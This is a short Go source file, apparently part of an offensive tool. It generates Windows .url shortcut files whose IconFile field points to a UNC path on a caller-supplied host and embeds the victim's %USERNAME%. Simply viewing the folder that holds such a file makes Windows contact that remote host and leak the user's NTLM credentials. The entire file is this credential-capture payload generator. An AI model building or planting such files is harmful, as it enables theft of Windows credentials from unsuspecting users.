package Templates

import "fmt"

// Declare variables
var urlFileTemplate string = `[InternetShortcut]
URL=%s
WorkingDirectory=%s
IconFile=\\%s\%%USERNAME%%.icon
IconIndex=1
`

// GetURLFileTemplate returns the template with placeholders replaced by provided values
func GetURLFileTemplate(url, workingDirectory, iconFile string) string {
	return fmt.Sprintf(urlFileTemplate, url, workingDirectory, iconFile)
}
